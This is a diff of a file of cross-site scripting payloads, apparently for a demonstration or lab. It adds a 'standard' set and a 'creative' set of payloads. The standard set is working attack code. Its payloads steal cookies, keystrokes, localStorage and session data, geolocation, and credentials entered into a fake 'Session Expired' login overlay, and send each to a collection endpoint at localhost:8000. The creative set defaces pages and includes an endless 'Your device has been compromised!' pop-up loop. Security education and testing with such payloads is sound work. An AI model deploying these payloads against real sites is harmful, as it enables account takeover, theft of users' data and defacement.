@@ -1,31 +1,73 @@
+<!-- standard XSS attack payloads -->
 // 1. Basic Alert (Test payload)
-<script>alert('XSS vulnerability confirmed!');</script>
+<script>
+    alert("XSS vulnerability confirmed!");
+</script>
 
 // 2. Cookie Theft
 <script>
-fetch('http://localhost:8000/collect_data/?stolen_cookie=' + encodeURIComponent(document.cookie));
+    fetch(
+        "http://localhost:8000/collect_data/?stolen_cookie=" +
+            encodeURIComponent(document.cookie),
+    );
 </script>
 
 // 3. Keylogger Demonstration
 <script>
-let keys = '';
-document.addEventListener('keypress', function(e) {
-    keys += e.key;
-    if(keys.length >= 10) {  // Send every 10 keystrokes
-        fetch('http://localhost:8000/collect_data/?keystrokes=' + encodeURIComponent(keys));
-        keys = '';
-    }
-});
+    let keys = "";
+    document.addEventListener("keypress", function (e) {
+        keys += e.key;
+        if (keys.length >= 10) {
+            // Send every 10 keystrokes
+            fetch(
+                "http://localhost:8000/collect_data/?keystrokes=" +
+                    encodeURIComponent(keys),
+            );
+            keys = "";
+        }
+    });
 </script>
 
 // 4. Fake Login Form Injection
-<div style="position:fixed; top:0; left:0; width:100%; height:100%; background-color:rgba(0,0,0,0.8); z-index:10000;">
-    <div style="position:relative; top:20%; left:50%; transform:translate(-50%,-50%); background-color:white; padding:20px; border-radius:5px;">
+<div
+    style="
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.8);
+        z-index: 10000;
+    "
+>
+    <div
+        style="
+            position: relative;
+            top: 20%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 20px;
+            border-radius: 5px;
+        "
+    >
         <h2>Session Expired</h2>
         <p>Please log in again to continue:</p>
-        <form onsubmit="event.preventDefault(); fetch('http://localhost:8000/collect_data/?credentials=' + encodeURIComponent(document.getElementById('fake_username').value + ':' + document.getElementById('fake_password').value));">
-            <input type="text" id="fake_username" placeholder="Username" style="margin:5px;"><br>
-            <input type="password" id="fake_password" placeholder="Password" style="margin:5px;"><br>
+        <form
+            onsubmit="event.preventDefault(); fetch('http://localhost:8000/collect_data/?credentials=' + encodeURIComponent(document.getElementById('fake_username').value + ':' + document.getElementById('fake_password').value));"
+        >
+            <input
+                type="text"
+                id="fake_username"
+                placeholder="Username"
+                style="margin: 5px"
+            /><br />
+            <input
+                type="password"
+                id="fake_password"
+                placeholder="Password"
+                style="margin: 5px"
+            /><br />
             <button type="submit">Login</button>
         </form>
     </div>
@@ -33,49 +75,266 @@ document.addEventListener('keypress', function(e) {
 
 // 5. Content Defacement
 <script>
-document.querySelectorAll('*').forEach(element => {
-    if (element.childNodes.length === 1 && element.childNodes[0].nodeType === 3)
-        element.textContent = 'Hacked!';
-    if (element.tagName === 'IMG')
-        element.src = 'https://example.com/hacked.jpg';
-});
+    document.querySelectorAll("*").forEach((element) => {
+        if (
+            element.childNodes.length === 1 &&
+            element.childNodes[0].nodeType === 3
+        )
+            element.textContent = "Hacked!";
+        if (element.tagName === "IMG")
+            element.src = "https://example.com/hacked.jpg";
+    });
 </script>
 
 // 6. Session Hijacking with localStorage Theft
 <script>
-const stolenData = {
-    localStorage: JSON.stringify(localStorage),
-    sessionStorage: JSON.stringify(sessionStorage),
-    cookies: document.cookie
-};
-fetch('http://localhost:8000/collect_data/?storage_data=' + encodeURIComponent(JSON.stringify(stolenData)));
+    const stolenData = {
+        localStorage: JSON.stringify(localStorage),
+        sessionStorage: JSON.stringify(sessionStorage),
+        cookies: document.cookie,
+    };
+    fetch(
+        "http://localhost:8000/collect_data/?storage_data=" +
+            encodeURIComponent(JSON.stringify(stolenData)),
+    );
 </script>
 
 // 7. HTML5 Geolocation Theft
 <script>
-if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(position => {
-        fetch('http://localhost:8000/collect_data/?location=' +
-        encodeURIComponent(JSON.stringify({
-            lat: position.coords.latitude,
-            lng: position.coords.longitude
-        })));
-    });
-}
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition((position) => {
+            fetch(
+                "http://localhost:8000/collect_data/?location=" +
+                    encodeURIComponent(
+                        JSON.stringify({
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                        }),
+                    ),
+            );
+        });
+    }
 </script>
 
 // 8. Webcam Access Demonstration (requires user permission)
 <script>
-if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-    navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.autoplay = true;
-            document.body.appendChild(video);
-            // In a real attack, this could stream to an attacker's server
-            console.log('Camera access granted');
-        })
-        .catch(err => console.error('Camera access denied'));
-}
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices
+            .getUserMedia({ video: true })
+            .then((stream) => {
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                video.autoplay = true;
+                document.body.appendChild(video);
+                // In a real attack, this could stream to an attacker's server
+                console.log("Camera access granted");
+            })
+            .catch((err) => console.error("Camera access denied"));
+    }
+</script>
+
+<!-- creative XSS payloads -->
+// 1. Random Color Changing Background
+<script>
+    setInterval(() => {
+        const randomColor =
+            "#" + Math.floor(Math.random() * 16777215).toString(16);
+        document.body.style.backgroundColor = randomColor;
+        document.body.style.transition = "background-color 2s";
+    }, 5000);
+</script>
+
+// 2. Chaotic Text Transformation
+<script>
+    setInterval(() => {
+        document.querySelectorAll("*").forEach((element) => {
+            if (
+                element.childNodes.length === 1 &&
+                element.childNodes[0].nodeType === 3
+            ) {
+                const rotation = Math.random() * 360;
+                const scale = 0.8 + Math.random() * 0.4;
+                const fonts = [
+                    "Arial",
+                    "Times New Roman",
+                    "Comic Sans MS",
+                    "Courier New",
+                    "Impact",
+                ];
+                const randomFont =
+                    fonts[Math.floor(Math.random() * fonts.length)];
+                element.style.transform = `rotate(${rotation}deg) scale(${scale})`;
+                element.style.fontFamily = randomFont;
+                element.style.transition = "all 1s";
+                element.style.display = "inline-block";
+            }
+        });
+    }, 3000);
+</script>
+
+// 3. Moving Virus Animation
+<script>
+    const virus = document.createElement("div");
+    virus.innerHTML = "🦠";
+    virus.style.cssText = `
+    position: fixed;
+    font-size: 50px;
+    pointer-events: none;
+    z-index: 10000;
+    transition: all 1s ease-in-out;
+`;
+    document.body.appendChild(virus);
+
+    setInterval(() => {
+        const x = Math.random() * (window.innerWidth - 50);
+        const y = Math.random() * (window.innerHeight - 50);
+        virus.style.left = x + "px";
+        virus.style.top = y + "px";
+        virus.style.transform = `rotate(${Math.random() * 360}deg)`;
+    }, 2000);
+</script>
+
+// 4. Matrix Rain Effect
+<script>
+    const canvas = document.createElement("canvas");
+    canvas.style.cssText = `
+    position: fixed;
+    top: 0;
+    left: 0;
+    z-index: -1;
+    opacity: 0.8;
+`;
+    document.body.appendChild(canvas);
+    const ctx = canvas.getContext("2d");
+
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+
+    const matrix = "HACK3D!@#$%^&*()_+";
+    const drops = [];
+    const fontSize = 14;
+    const columns = canvas.width / fontSize;
+
+    for (let x = 0; x < columns; x++) drops[x] = 1;
+
+    function draw() {
+        ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#0F0";
+        ctx.font = fontSize + "px monospace";
+
+        for (let i = 0; i < drops.length; i++) {
+            const text = matrix[Math.floor(Math.random() * matrix.length)];
+            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975)
+                drops[i] = 0;
+            drops[i]++;
+        }
+    }
+
+    setInterval(draw, 33);
+</script>
+
+// 5. Earthquake Effect
+<script>
+    setInterval(() => {
+        document.body.style.transform = `translate(${Math.random() * 10 - 5}px, ${Math.random() * 10 - 5}px)`;
+    }, 50);
+</script>
+
+// 6. Disco Light Effect
+<script>
+    setInterval(() => {
+        const elements = document.querySelectorAll("*");
+        elements.forEach((el) => {
+            const r = Math.floor(Math.random() * 256);
+            const g = Math.floor(Math.random() * 256);
+            const b = Math.floor(Math.random() * 256);
+            el.style.textShadow = `0 0 5px rgb(${r},${g},${b})`;
+        });
+    }, 100);
+</script>
+
+// 7. Gravity Effect (Elements Fall)
+<script>
+    document.querySelectorAll("*").forEach((element) => {
+        if (element !== document.body) {
+            element.style.position = "relative";
+            let pos = 0;
+            let velocity = 0;
+            const gravity = 0.5;
+
+            setInterval(() => {
+                velocity += gravity;
+                pos += velocity;
+
+                if (pos > window.innerHeight) {
+                    pos = -element.offsetHeight;
+                    velocity = 0;
+                }
+
+                element.style.top = pos + "px";
+            }, 50);
+        }
+    });
+</script>
+
+// 8. Mouse Trail Effect
+<script>
+    const dots = [];
+    for (let i = 0; i < 20; i++) {
+        const dot = document.createElement("div");
+        dot.style.cssText = `
+        position: fixed;
+        width: 10px;
+        height: 10px;
+        background: red;
+        border-radius: 50%;
+        pointer-events: none;
+        z-index: 10000;
+    `;
+        dots.push(dot);
+        document.body.appendChild(dot);
+    }
+
+    let mouseX = 0,
+        mouseY = 0;
+    document.addEventListener("mousemove", (e) => {
+        mouseX = e.clientX;
+        mouseY = e.clientY;
+    });
+
+    let currentDot = 0;
+    setInterval(() => {
+        const dot = dots[currentDot];
+        dot.style.left = mouseX + "px";
+        dot.style.top = mouseY + "px";
+        currentDot = (currentDot + 1) % dots.length;
+    }, 50);
+</script>
+
+// 9. Website Melting Effect
+<script>
+    document.querySelectorAll("*").forEach((element) => {
+        if (element !== document.body) {
+            element.style.transition = "all 10s";
+            element.style.transform = `
+            perspective(500px)
+            rotateX(${Math.random() * 180}deg)
+            scale(${0.5 + Math.random()})
+            skew(${Math.random() * 30}deg)
+        `;
+            element.style.opacity = "0.5";
+            element.style.filter = "blur(2px)";
+        }
+    });
+</script>
+
+// 10. Infinite Pop-up Loop (Use with caution!)
+<script>
+    function createEndlessPopups() {
+        alert("Your device has been compromised!");
+        setTimeout(createEndlessPopups, 10);
+    }
+    createEndlessPopups();
 </script>
